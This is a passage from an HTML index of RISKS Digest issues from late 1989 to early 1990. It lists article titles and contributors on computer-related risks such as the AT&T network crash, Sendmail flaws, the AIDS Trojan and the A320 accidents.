<LI><A HREF="/Risks/9.49.html#subj6">  How to improve your financial standing (Glenn Story)</A>
<LI><A HREF="/Risks/9.49.html#subj7">  Re: Self-trust and computer professionals (Mike McNally)</A>
<LI><A HREF="/Risks/9.49.html#subj8">  Re: problems with government project specifications (Bob Estell)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.50.html">Volume 9 Issue 50 (3 Dec 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.50.html#subj1">  Vote counting problems - experience in Michigan (Lawrence Kestenbaum, PGN)</A>
<LI><A HREF="/Risks/9.50.html#subj2">  Specs and custom software (Curtis Jackson)</A>
<LI><A HREF="/Risks/9.50.html#subj3">  Pentagon Computer Costs (Gary Chapman)</A>
<LI><A HREF="/Risks/9.50.html#subj4">  Software tool munges code (Nick Lai)</A>
<LI><A HREF="/Risks/9.50.html#subj5">  Marshall Williams convicted of destroying data (PGN)</A>
<LI><A HREF="/Risks/9.50.html#subj6">  Mitnick's accomplice sentenced (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.50.html#subj7">  Desktop forgery (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.50.html#subj8">  Paul Brodeur's "Currents of Death" (Werner Uhrig)</A>
<LI><A HREF="/Risks/9.50.html#subj9">  McRisks - Electronic Interference in Fast Food Automation (Robert Horvitz)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.51.html">Volume 9 Issue 51 (5 Dec 1989 )</A>
<DD><UL>
<LI><A HREF="/Risks/9.51.html#subj1">  Computer bungling of auto insurance premiums (Barry Kolb)</A>
<LI><A HREF="/Risks/9.51.html#subj2">  Computerized voting machine misbehaves (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.51.html#subj3">  Re: Vote counting problems - experience in Michigan (Jeffrey R Kell)</A>
<LI><A HREF="/Risks/9.51.html#subj4">  Privacy issues raised about automating toll collection (Stephen W Thompson)</A>
<LI><A HREF="/Risks/9.51.html#subj5">  Re: Electronic Interference in Fast Food Automation (David Chase)</A>
<LI><A HREF="/Risks/9.51.html#subj6">  Digital Cellular and the government (Tim Russell)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.52.html">Volume 9 Issue 52 (8 Dec 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.52.html#subj1">  Unsafe French software? (A. N. Walker)</A>
<LI><A HREF="/Risks/9.52.html#subj2">  Congress repeals catastrophic insurance, SSA still collects premiums     (Rich Rosenbaum)
</A>
<LI><A HREF="/Risks/9.52.html#subj3">  Another runaway military computing project: WWMCCS (Jon Jacky)</A>
<LI><A HREF="/Risks/9.52.html#subj4">  Courts say violation of professional code is malpractice (Jon Jacky)</A>
<LI><A HREF="/Risks/9.52.html#subj5">  Risks of computerized typesetting     (Chuq Von Rospach from SF-LOVERS, via Alayne McGregor)
</A>
<LI><A HREF="/Risks/9.52.html#subj6">  486 chip faults: PC shipments halted, customers warned (Jon Jacky)</A>
<LI><A HREF="/Risks/9.52.html#subj7">  Selling Government-Held Information (Peter Jones)</A>
<LI><A HREF="/Risks/9.52.html#subj8">  Cellular phone service in Hungary (Adam J. Kucznetsov)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.53.html">Volume 9 Issue 53 (11 Dec 1989 )</A>
<DD><UL>
<LI><A HREF="/Risks/9.53.html#subj1">  Computerized public records boon to private eyes probing suitors    (Jay Elinsky, Jon von Zelowitz)
</A>
<LI><A HREF="/Risks/9.53.html#subj2">  Should computers be legally responsible? (A. Lester Buck)</A>
<LI><A HREF="/Risks/9.53.html#subj3">  Automatic toll systems (Jerry Harper)</A>
<LI><A HREF="/Risks/9.53.html#subj4">  Software Development (Bill Murray)</A>
<LI><A HREF="/Risks/9.53.html#subj5">  Newsgroup posting rejected, rejected, rejected, ... (Earle Ake)</A>
<LI><A HREF="/Risks/9.53.html#subj6">  Comments on Unix INDENT program     (Simson L. Garfinkel, Nick Lai, David McAllister))
</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.54.html">Volume 9 Issue 54 (12 Dec 1989 )</A>
<DD><UL>
<LI><A HREF="/Risks/9.54.html#subj1">  Mariner I [once more] (Mark Brader and Fred Webb)</A>
<LI><A HREF="/Risks/9.54.html#subj2">  Re: Software tool (indent) munges code     (Mark Moraes [2x], Joe Dellinger, Amos Shapir)
</A>
<LI><A HREF="/Risks/9.54.html#subj3">  Re: SSA software maintenance (Dan Franklin)</A>
<LI><A HREF="/Risks/9.54.html#subj4">  Re: Don't Give Social Security Numbers to Girlfriends (Will Martin)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.55.html">Volume 9 Issue 55 (18 Dec 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.55.html#subj1">  Risks of Mail (the "yellow peril"?) (Joe Dellinger)</A>
<LI><A HREF="/Risks/9.55.html#subj2">  PR RISKs of computer communications -- Prodigy (Mark Jackson)</A>
<LI><A HREF="/Risks/9.55.html#subj3">  Re: private eyes probing suitors -- Amazon Women on the Moon (Dwight McKay)</A>
<LI><A HREF="/Risks/9.55.html#subj4">  Faults in 29000 RISC chip (Jon Jacky)</A>
<LI><A HREF="/Risks/9.55.html#subj5">  The Trojan horse named "AIDS" (contributed by many who are not neigh-sayers)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.56.html">Volume 9 Issue 56 (21 Dec 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.56.html#subj1">  GAO Says IS technology is transforming the Government (Dave Davis)</A>
<LI><A HREF="/Risks/9.56.html#subj2">  California Supreme Court endorses computerized horoscopes (Clifford Johnson)</A>
<LI><A HREF="/Risks/9.56.html#subj3">  Software malpractice (Steve Philipson)</A>
<LI><A HREF="/Risks/9.56.html#subj4">  Computerized card catalog (Roy Smith)</A>
<LI><A HREF="/Risks/9.56.html#subj5">  Frustrated with phones (Shamus McBride)</A>
<LI><A HREF="/Risks/9.56.html#subj6">  23 years MTBF ??? (David A. Honig)</A>
<LI><A HREF="/Risks/9.56.html#subj7">  Re: Another runaway military computing project: WWMCCS (Tom Reid)</A>
<LI><A HREF="/Risks/9.56.html#subj8">  Virus Hearing on TV (Marc Rotenberg)</A>
<LI><A HREF="/Risks/9.56.html#subj9">  Risks of posting to risks! (Joe Dellinger)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.57.html">Volume 9 Issue 57 (4 Jan 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.57.html#subj1">  Self-Service ordering in retail establishments (Russell McFatter)</A>
<LI><A HREF="/Risks/9.57.html#subj2">  Programming Languages and Romanian Dictators (Eric Haines)</A>
<LI><A HREF="/Risks/9.57.html#subj3">  `Credit Card' found from 13th Century (Steve Crocker)</A>
<LI><A HREF="/Risks/9.57.html#subj4">  Risks of computerfax (Steve Elias)</A>
<LI><A HREF="/Risks/9.57.html#subj5">  Password Security: A Case History, by Bob Morris and Ken Thompson (PGN)</A>
<LI><A HREF="/Risks/9.57.html#subj6">  "What Really Happened Oct. 13" (Joe Morris)</A>
<LI><A HREF="/Risks/9.57.html#subj7">  The risks of not learning? (Al Arsenault)</A>
<LI><A HREF="/Risks/9.57.html#subj8">  RAND has not received "AIDS Information Disk" (Correction from Jim Gillogly)</A>
<LI><A HREF="/Risks/9.57.html#subj9">  Call for Papers -- 13th National Computer Security Conference (Jack Holleran)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.58.html">Volume 9 Issue 58 (9 Jan 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.58.html#subj1">  New-Years' Lotto goes Blotto (Jim Anderson)</A>
<LI><A HREF="/Risks/9.58.html#subj2">  Railroad interlocking systems (Douglas W. Jones)</A>
<LI><A HREF="/Risks/9.58.html#subj3">  Sorry, the bank's already debited your mortgage (Dave Horsfall)</A>
<LI><A HREF="/Risks/9.58.html#subj4">  Positive fingerprint identification? (Dave Horsfall)</A>
<LI><A HREF="/Risks/9.58.html#subj5">  Re: Password Security: A Case History (Fernando J. Corbato)</A>
<LI><A HREF="/Risks/9.58.html#subj6">  The risks of not learning - and of ignoring realities (Jerry Leichter)</A>
<LI><A HREF="/Risks/9.58.html#subj7">  6th Chaos Communication Congress, Hamburg 27-29 Dec 1989 (Klaus Brunnstein)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.60.html">Volume 9 Issue 60 (15 Jan 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.60.html#subj1">  The C3 legacy: top-down goes belly-up recursively (Les Earnest)</A>
<LI><A HREF="/Risks/9.60.html#subj2">  Dispatchinate Computerized Cab Service (PGN)</A>
<LI><A HREF="/Risks/9.60.html#subj3">  Risks of manual page formatters and inserted text (J. Eric Townsend)</A>
<LI><A HREF="/Risks/9.60.html#subj4">  Re: What hung the computer? (Dave Platt)</A>
<LI><A HREF="/Risks/9.60.html#subj5">  Perils of not planning for errors (Ted Shapin)</A>
<LI><A HREF="/Risks/9.60.html#subj6">  Wrong 800 numbers (Steven W. Grabhorn)</A>
<LI><A HREF="/Risks/9.60.html#subj7">  Password Sharing (Dave Bafumo)</A>
<LI><A HREF="/Risks/9.60.html#subj8">  Call for papers for computer security foundations workshop (John McLean)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.61.html">Volume 9 Issue 61 (20 Jan 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.61.html#subj1">  Shortage of RISKS but no shortage of risks -- the week in review (PGN)</A>
<LI><A HREF="/Risks/9.61.html#subj2">  AT&amp;T Failure (Bill Murray, Jim Horning)</A>
<LI><A HREF="/Risks/9.61.html#subj3">  Risks of Voicemail systems that expect a human at the other end (R. Aminzade)</A>
<LI><A HREF="/Risks/9.61.html#subj4">  Risks of vote counting (Alayne McGregor)</A>
<LI><A HREF="/Risks/9.61.html#subj5">  Risks of supermarket checkout scanners (David Marks)</A>
<LI><A HREF="/Risks/9.61.html#subj6">  European R&amp;D in Road Transportation (Brian Randell)</A>
<LI><A HREF="/Risks/9.61.html#subj7">  Old habits die hard (Dave Horsfall)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.62.html">Volume 9 Issue 62 (26 Jan 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.62.html#subj1">  Australian medical database linkages (Michael Bednarek)</A>
<LI><A HREF="/Risks/9.62.html#subj2">  Cause of AT&amp;T network failure ("Telephony", Jim Harkins)</A>
<LI><A HREF="/Risks/9.62.html#subj3">  London Stock Market Disruption (courtesy of Steve Milunovic)</A>
<LI><A HREF="/Risks/9.62.html#subj4">  Railway interlocking (Clive Feather)</A>
<LI><A HREF="/Risks/9.62.html#subj5">  More risks to computers (Richard Thomsen)</A>
<LI><A HREF="/Risks/9.62.html#subj6">  Re: Risks of supermarket checkout scanners    (Marvin Moskowitz, Doug Renner, Don Craig)
</A>
<LI><A HREF="/Risks/9.62.html#subj7">  Robert T. Morris Convicted (Michael J. Chinni)</A>
<LI><A HREF="/Risks/9.62.html#subj8">  Advance Program for Oakland Symposium (REVISED) (Debbie Cooper)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.63.html">Volume 9 Issue 63 (31 Jan 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.63.html#subj1">  Vive la difference? (Peter G. Neumann)</A>
<LI><A HREF="/Risks/9.63.html#subj2">  Airbus crash of June 88 (Olivier Crepin-Leblond)</A>
<LI><A HREF="/Risks/9.63.html#subj3">  AT&amp;T Crash Statement: The Official Report (Don H Kemp via Geoff Goodfellow)</A>
<LI><A HREF="/Risks/9.63.html#subj4">  Important Lesson from AT&amp;T Tragedy (Bill Murray)</A>
<LI><A HREF="/Risks/9.63.html#subj5">  Potential Lesson From AT&amp;T (Bill Murray)</A>
<LI><A HREF="/Risks/9.63.html#subj6">  Sun Sendmail Vulnerability (Kenneth R. van Wyk)</A>
<LI><A HREF="/Risks/9.63.html#subj7">  GPO Library disk infection (PC) (Kenneth R. van Wyk)</A>
<LI><A HREF="/Risks/9.63.html#subj8">  Re: Password Sharing (Al Arsenault)</A>
<LI><A HREF="/Risks/9.63.html#subj9">  Annual Computer Security Applications Conference (Marshall D. Abrams)</A>
<LI><A HREF="/Risks/9.63.html#subj10">  Virology (Gene Spafford)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.64.html">Volume 9 Issue 64 (1 Feb 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.64.html#subj1">  SENDMAIL horrors (PGN)</A>
<LI><A HREF="/Risks/9.64.html#subj2">  Software error at Bruce nuclear station (Mark Bartelt)</A>
<LI><A HREF="/Risks/9.64.html#subj3">  New South Wales Police deregisters police cars (Diomidis Spinellis)</A>
<LI><A HREF="/Risks/9.64.html#subj4">  Fire and 753 controllers (need a light?) (Neal Immega via Mark Seiden)</A>
<LI><A HREF="/Risks/9.64.html#subj5">  The substantiative error made by AT&amp;T (Robert Ullmann)</A>
<LI><A HREF="/Risks/9.64.html#subj6">  Re: AT&amp;T Crash Statement: The Official Report (Bob Munck)</A>
<LI><A HREF="/Risks/9.64.html#subj7">  Re: Airbus crash of June 88 (Robert Dorsett)</A>
<LI><A HREF="/Risks/9.64.html#subj8">  Re: Virology and an infectious date syndrome (Gene Spafford)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.65.html">Volume 9 Issue 65 (2 Feb 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.65.html#subj1">  The C3 legacy, Part 2: a SAGE beginning (Les Earnest)</A>
<LI><A HREF="/Risks/9.65.html#subj2">  Sendmail Flaw (Geoffrey H. Cooper)</A>
<LI><A HREF="/Risks/9.65.html#subj3">  Filing 1040 Electronically (Bill Murray)</A>
<LI><A HREF="/Risks/9.65.html#subj4">  Predicting Problems (David desJardins)</A>
<LI><A HREF="/Risks/9.65.html#subj5">  Airbus crash (Dave Morton)</A>
<LI><A HREF="/Risks/9.65.html#subj6">  The Trojan horse named `AIDS' revisited (PGN)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.66.html">Volume 9 Issue 66 (5 Feb 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.66.html#subj1">  Another SAGE memoir (Jon Jacky)</A>
<LI><A HREF="/Risks/9.66.html#subj2">  DoD plans another attack on the "software crisis" (Jon Jacky)</A>
<LI><A HREF="/Risks/9.66.html#subj3">  The Cultural Dimensions of Educational Computing (Phil Agre)</A>
<LI><A HREF="/Risks/9.66.html#subj4">  Vincennes' Aegis System: Why did RISKS ignore specifications? (R. Horn)</A>
<LI><A HREF="/Risks/9.66.html#subj5">  Computer Virus Book of Records (Simson L. Garfinkel)</A>
<LI><A HREF="/Risks/9.66.html#subj6">  Re: AT&amp;T (Gene Spafford, David Keppel, Stanley Chow)</A>
<LI><A HREF="/Risks/9.66.html#subj7">  Sendmail (Brian Kantor, Rayan Zachariassen, Geoffrey H. Cooper,     Kyle Jones, Craig Everhart)
</A>
<LI><A HREF="/Risks/9.66.html#subj8">  Re: Risks of Voicemail systems (Randall Davis)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.67.html">Volume 9 Issue 67 (8 Feb 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.67.html#subj1">  Shoplifting and Computers (Curtis P. Yeske)</A>
<LI><A HREF="/Risks/9.67.html#subj2">  New movie Script writer (Olivier Crepin-Leblond)</A>
<LI><A HREF="/Risks/9.67.html#subj3">  Re: Computers, good and evil (George L Sicherman)</A>
<LI><A HREF="/Risks/9.67.html#subj4">  The C3 legacy, Part 3: Command-control catches on (Les Earnest)</A>
<LI><A HREF="/Risks/9.67.html#subj5">  Vincennes' ROEs revisited (Clifford Johnson)</A>
<LI><A HREF="/Risks/9.67.html#subj6">  SOGS - Hubble Space Telescope software now ready (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.67.html#subj7">  AT&amp;T and reentrant code (John A. Pershing Jr)</A>
<LI><A HREF="/Risks/9.67.html#subj8">  AT&amp;T and error recovery (Jonathan I. Kamens)</A>
<LI><A HREF="/Risks/9.67.html#subj9">  Dillard's Dept Stores Use SSN as Sales ID - Printed on Receipts (Allen Gwinn)</A>
<LI><A HREF="/Risks/9.67.html#subj10">  AutoAlarms (Robert J Woodhead)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.68.html">Volume 9 Issue 68 (14 Feb 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.68.html#subj1">  Re: Caller ID (NYTimes editorial) (John M. Sullivan)</A>
<LI><A HREF="/Risks/9.68.html#subj2">  How to make answering machines deliver ransom messages (Denis Coskun)</A>
<LI><A HREF="/Risks/9.68.html#subj3">  More on the Hubble Space Telescope (Hank Strub)</A>
<LI><A HREF="/Risks/9.68.html#subj4">  Human blamed, not the computer! -- jury duty (Lee S. Ridgway)</A>
<LI><A HREF="/Risks/9.68.html#subj5">  Accents are more than just decorations (Kai-Mikael J{{-Aro)</A>
<LI><A HREF="/Risks/9.68.html#subj6"> [Parse-ly, Rosemary, Time, Light, Control &amp; Other SAGE Remarks] (Martin Minow)</A>
<LI><A HREF="/Risks/9.68.html#subj7">  Blazers (Jeff Berkowitz)</A>
<LI><A HREF="/Risks/9.68.html#subj8">  Re: Computers, good and evil (Gregg TeHennepe)</A>
<LI><A HREF="/Risks/9.68.html#subj9">  Telephone Switch Security (Roland Ouellette)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.69.html">Volume 9 Issue 69 (20 Feb 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.69.html#subj1">  A320 accident (Nancy Leveson, George Michaelson)</A>
<LI><A HREF="/Risks/9.69.html#subj2">  Ferry line replaces "sail-by-wire" with pneumatic controls (Jon Jacky)</A>
<LI><A HREF="/Risks/9.69.html#subj3">  Now Prodigy Can Read You (Donald B Wechsler)</A>
<LI><A HREF="/Risks/9.69.html#subj4">  3 KGB Wily Hackers convicted, mild sentences (Klaus Brunnstein)</A>
<LI><A HREF="/Risks/9.69.html#subj5">  Problems/risks due to programming language, stories requested.  [Item Includes     AT&amp;T "do...while"..."switch"..."if"..."break" tale] (Gerald Baumgartner)
</A>
<LI><A HREF="/Risks/9.69.html#subj6">  AT&amp;T Says New Goof Wiped Out Many Toll-Free Calls (David B. Benson)</A>
<LI><A HREF="/Risks/9.69.html#subj7">  Re: Computerized Collect Calls (Adam Gaffin via Mark Brader)</A>
<LI><A HREF="/Risks/9.69.html#subj8">  RISKS of ANI blocking (James C Blasius)</A>
<LI><A HREF="/Risks/9.69.html#subj9">  "Brilliant Pebbles" (Gary Chapman) </A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.70.html">Volume 9 Issue 70 (23 Feb 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.70.html#subj1">  Neutron reactor lands in hot water (Steve Strassmann)</A>
<LI><A HREF="/Risks/9.70.html#subj2">  Yet another laserwriter health risk? (Roy Smith via Mark Seiden)</A>
<LI><A HREF="/Risks/9.70.html#subj3">  Computer security at stock exchanges vulnerable (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.70.html#subj4">  A320 accident (Udo Voges)</A>
<LI><A HREF="/Risks/9.70.html#subj5">  Problems/risks due to programming language (AT&amp;T Bug)    (Jonathan I. Kamens, Steve Nuchia, David L. Golber, Robert L. Smith)
</A>
<LI><A HREF="/Risks/9.70.html#subj6">  Re: "Provably insecure programming language" (Mark McWiggins)</A>
<LI><A HREF="/Risks/9.70.html#subj7">  Re: Computerized Collect Calls (Joseph Beckman)</A>
<LI><A HREF="/Risks/9.70.html#subj8">  What makes a hacker hack? (Nigel Voss-Roberts)</A>
<LI><A HREF="/Risks/9.70.html#subj9">  The "Twelve Tricks" Trojan horse (Christoph Fischer via John Rushby)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.71.html">Volume 9 Issue 71 (26 Feb 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.71.html#subj1">  Journalists and computers: `Z' (R. Clayton)</A>
<LI><A HREF="/Risks/9.71.html#subj2">  Space Shuttle (Steve Bellovin)</A>
<LI><A HREF="/Risks/9.71.html#subj3">  Magellan spacecraft will need frequent guidance from Earth (David B. Benson)</A>
<LI><A HREF="/Risks/9.71.html#subj4">  More on Air India Airbus A320 (Steve Milunovic)</A>
<LI><A HREF="/Risks/9.71.html#subj5">  AT&amp;T (Clifford Johnson, Rob Warnock, Steve Bellovin, David Paul Hoyt)</A>
<LI><A HREF="/Risks/9.71.html#subj6">  Re: Computerized Collect Calls (John (J.G.) Mainwaring)</A>
<LI><A HREF="/Risks/9.71.html#subj7">  A different multiple-copy problem (SEN) (Dan Craigen)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.72.html">Volume 9 Issue 72 (28 Feb 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.72.html#subj1">  Clients cross about crossed wires (David Sherman)</A>
<LI><A HREF="/Risks/9.72.html#subj2">  100-year-old can drive four years without test (David Sherman)</A>
<LI><A HREF="/Risks/9.72.html#subj3">  Some comments on the Airbus (Robert Dorsett, Martyn Thomas)</A>
<LI><A HREF="/Risks/9.72.html#subj4">  Re: Problems/risks due to programming language (Bruce Hamilton)</A>
<LI><A HREF="/Risks/9.72.html#subj5">  Comments on programmer error (Geoffrey Welsh)</A>
<LI><A HREF="/Risks/9.72.html#subj6">  "Goto considered harmful" considered harmful (Brad Templeton)</A>
<LI><A HREF="/Risks/9.72.html#subj7">  lockd (Caveh Jalali)</A>
<LI><A HREF="/Risks/9.72.html#subj8">  Re: Railroad interlocking systems (J.A.Hunter via Brian Randell)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.73.html">Volume 9 Issue 73 (6 Mar 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.73.html#subj1">  Another 100-year computer saga (David B. Benson)</A>
<LI><A HREF="/Risks/9.73.html#subj2">  Traffic System Failure (Rich Neitzel)</A>
<LI><A HREF="/Risks/9.73.html#subj3">  Railway interlocking systems (Clive Feather)</A>
<LI><A HREF="/Risks/9.73.html#subj4">  Avionics in the media (John M. Sullivan)</A>
<LI><A HREF="/Risks/9.73.html#subj5">  Re: A320 (Steven Philipson, Subhasish Mazumdar, Pete Mellor)</A>
<LI><A HREF="/Risks/9.73.html#subj6">  Mileage Plus wants me to move (Tim Kay)</A>
<LI><A HREF="/Risks/9.73.html#subj7">  Credit-card fraud (Douglas Mason)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.74.html">Volume 9 Issue 74 (12 Mar 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.74.html#subj1">  Airbus Crash: Reports from the Indian Press (N. Balaji)</A>
<LI><A HREF="/Risks/9.74.html#subj2">  Indian Airlines A320 in the German press (Udo Voges)</A>
<LI><A HREF="/Risks/9.74.html#subj3">  The C3 legacy, Part 4:  A gaggle of L-systems (Les Earnest)</A>
<LI><A HREF="/Risks/9.74.html#subj4">  The risks of keeping old versions -- Daigle book (Graeme Hirst/David Sherman)</A>
<LI><A HREF="/Risks/9.74.html#subj5">  PSU Hackers thwarted (Angela Marie Thomas)</A>
<LI><A HREF="/Risks/9.74.html#subj6">  Anonymous Word Processing: `Z' (Jon von Zelowitz)</A>
<LI><A HREF="/Risks/9.74.html#subj7">  Re: Now Prodigy Can Read You (Eric Roskos)</A>
<LI><A HREF="/Risks/9.74.html#subj8">  Re: Traffic System Failure (Peter Ahrens)</A>
<LI><A HREF="/Risks/9.74.html#subj9">  Tracking criminals and the DRUG police-action (J. Eric Townsend)</A>
<LI><A HREF="/Risks/9.74.html#subj10">  Human-Centered Automation (Robert Dorsett)</A>
<LI><A HREF="/Risks/9.74.html#subj11">  Drive-by-wire cars (Craig Leres)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.75.html">Volume 9 Issue 75 (15 Mar 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.75.html#subj1">  PRODIGY updating programs (Simson L. Garfinkel)</A>
<LI><A HREF="/Risks/9.75.html#subj2">  Who shall guard the guards? (Robert A. Levene)</A>
<LI><A HREF="/Risks/9.75.html#subj3">  Journalistic hacking (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.75.html#subj4">  Caller-id by name (Gary T. Marx)</A>
<LI><A HREF="/Risks/9.75.html#subj5">  Re: PSU Hackers thwarted (David C Lawrence)</A>
<LI><A HREF="/Risks/9.75.html#subj6">  Re: Tracking criminals and the DRUG police-action (Brinton Cooper)</A>
<LI><A HREF="/Risks/9.75.html#subj7">  RISKS of "Evolutionary Software" (Rajnish and Gene Spafford via Will Martin)</A>
<LI><A HREF="/Risks/9.75.html#subj8">  Human-centered automation (Donald A Norman)</A>
<LI><A HREF="/Risks/9.75.html#subj9">  Re: Airbus Crash: Reports from the Indian Press (Henry Spencer)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.76.html">Volume 9 Issue 76 (19 Mar 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.76.html#subj1">  How history gets made, or, myths spread like viruses at the CVIA     (Doug McIlroy)
</A>
<LI><A HREF="/Risks/9.76.html#subj2">  London Underground wrong-way train in rush-hour (Brian Randell)</A>
<LI><A HREF="/Risks/9.76.html#subj3">  Privacy in Printout (L. P. Levine)</A>
<LI><A HREF="/Risks/9.76.html#subj4">  Send it by FedEx = Don't Send It At All! (Betsy Perry)</A>
<LI><A HREF="/Risks/9.76.html#subj5">  20th Int. Symp. on Fault-Tolerant Computing (Neil Speirs)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.77.html">Volume 9 Issue 77 (21 Mar 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.77.html#subj1">  Stranded Satellite (Steve Bellovin)</A>
<LI><A HREF="/Risks/9.77.html#subj2">  Re: London Underground wrong-way train in rush-hour (Richard A. Schumacher)</A>
<LI><A HREF="/Risks/9.77.html#subj3">  Internet Intruder (John Markoff via PGN (excerpted))</A>
<LI><A HREF="/Risks/9.77.html#subj4">  Internet Intruder Warning (J. Paul Holbrook)</A>
<LI><A HREF="/Risks/9.77.html#subj5">  Risks of reporting breakins (Randal Schwartz)</A>
<LI><A HREF="/Risks/9.77.html#subj6">  Re: Privacy in Printout (Tim Wood, Henry Spencer)</A>
<LI><A HREF="/Risks/9.77.html#subj7">  Computer-based phones threaten privacy (again!) ("34AEJ7D")</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.78.html">Volume 9 Issue 78 (5 Apr 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.78.html#subj1">  RAF Tornado collision (Dorothy R. Graham via PGN)</A>
<LI><A HREF="/Risks/9.78.html#subj2">  New Georgia Automobile Tags (Warren Tucker)</A>
<LI><A HREF="/Risks/9.78.html#subj3">  British tax tales (Bob Gray via Mark Brader)</A>
<LI><A HREF="/Risks/9.78.html#subj4">  Oslo Day in Norway?  No way! (Paul Dorey)</A>
<LI><A HREF="/Risks/9.78.html#subj5">  Computer backorder on cover letters (Yuri Rubinsky)</A>
<LI><A HREF="/Risks/9.78.html#subj6">  London Underground driver's action (Martyn Ould)</A>
<LI><A HREF="/Risks/9.78.html#subj7">  Hi-Tech Loo (Wayne W. Lui via Brian Randell)</A>
<LI><A HREF="/Risks/9.78.html#subj8">  Proposed UK Authority for Risk Management (Brian Randell) [See Box for cases]</A>
<LI><A HREF="/Risks/9.78.html#subj9">  More on Prodigy's Updating of a User's Disks (Eric Roskos, Paul Eggert)</A>
<LI><A HREF="/Risks/9.78.html#subj10">  April Fools Day on the net (D. Waitzman via Martin Minow)</A>
<LI><A HREF="/Risks/9.78.html#subj11">  Automated Fast Food (Dave Curry)</A>
<LI><A HREF="/Risks/9.78.html#subj12">  UNIX Trix (Paul Eggert)</A>
<LI><A HREF="/Risks/9.78.html#subj13">  Re: PSU Hackers thwarted (Pete Mellor)</A>
<LI><A HREF="/Risks/9.78.html#subj14">  Three Australians indicted for computer tampering (PGN)</A>
